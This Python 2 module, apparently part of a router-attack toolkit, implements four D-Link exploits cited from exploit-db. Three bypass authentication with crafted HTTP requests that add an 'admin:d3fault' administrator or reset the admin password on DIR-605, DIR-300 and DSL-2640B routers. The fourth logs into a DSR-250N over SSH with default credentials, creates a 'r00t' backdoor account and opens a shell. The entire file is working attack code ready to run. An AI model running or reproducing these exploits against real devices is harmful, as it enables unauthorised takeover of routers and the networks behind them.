from util import Msg, Error, debug
import urllib

#
# dlink vulnerabilities
#

#
# run the specified vuln
#
def run ( run ):
	if run == 1:
		# http://www.exploit-db.com/exploits/18638/

		print '[+] Adding admin \'admin\' with password \'d3fault\'...'
		url = 'http://192.168.1.1:80/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
		params = urllib.urlencode({'ACTION_POST':1, 'admin_name':'admin', 'admin_password1':'d3fault',
									'admin_password2':'d3fault'})
		try:
			response = urllib.urlopen(url, params)
		except Exception, j:
			Error('Error connecting to host.')
			return
		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
		print '[!] Page returned: '
		print response.read()

	elif run == 2:
		# http://www.exploit-db.com/exploits/15753/

		print '[+] Adding admin \'admin\' with password \'d3fault\'...'
		url = 'http://192.168.1.1:80/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
		params = urllib.urlencode({'ACTION_POST':1, 'admin_name':'admin',
								   'admin_password1':'d3fault','admin_password2':'d3fault',
								   'rt_enable_h':1, 'rt_port':8080, 'rt_ipaddr':'192.168.0.1337'})
		try:
			response = urllib.urlopen(url, params)
		except Exception, j:
			Error('Error connecting to host.')
			return
		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
		print '[!] Page returned: '
		print response.read()

	elif run == 3:
		# http://www.exploit-db.com/exploits/18499/

		print '[+] Changing \'admin\' password to \'d3fault\'...' 
		url = 'http://192.168.1.1:80/redpass.cgi?sysPassword=d3fault&change=1'		
		try:
			response = urllib.urlopen(url)
		except Exception, j:
			Error('Error connecting to host.')
			return
		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
		print '[!] Page returned: '
		print response.read()

	elif run == 4:
		# http://www.exploit-db.com/exploits/22930/
		try:
			import paramiko
		except ImportError:
			Error('Attack requires Paramiko library.')
			return

		Msg('Adding user \'r00t\' password \'d3fault\'...')
		# ssh in with admin:admin
		try:
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			connection = ssh.connect('192.168.1.1',22,username='admin',
										password='admin',timeout=3.0)
			channel = connection.get_transport().open_session()
			# add the user
			channel.exec_command('system users edit 1')
			channel.exec_command('username r00t')
			channel.exec_command('password d3fault')
			channel.exec_command('save')
			connection.close()
		except paramiko.AuthenticationException:
			Error('Default credentials disabled/incorrect.')
			return
		except Exception, j:
			Error('Error with SSH: %s'%j)
			return

		Msg('Done.  Logging in...')
		try:
			# ssh in with r00t:d3fault
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh.connect('192.168.1.1',22,username='r00t',
										password='d3fault',timeout=3.0)
			ssh.invoke_shell()
		except:
			Error('Error invoking shell access.')
			return
#
# router:vuln
#
def vulnerabilities():
	return [ 'DIR-605 v2.0 - Add Admin',
			 'DIR-300 v1.04 - Add Admin',
			 'DSL-2640B - Change Admin Password',
             'DSR-250N - Backdoor root',
			]
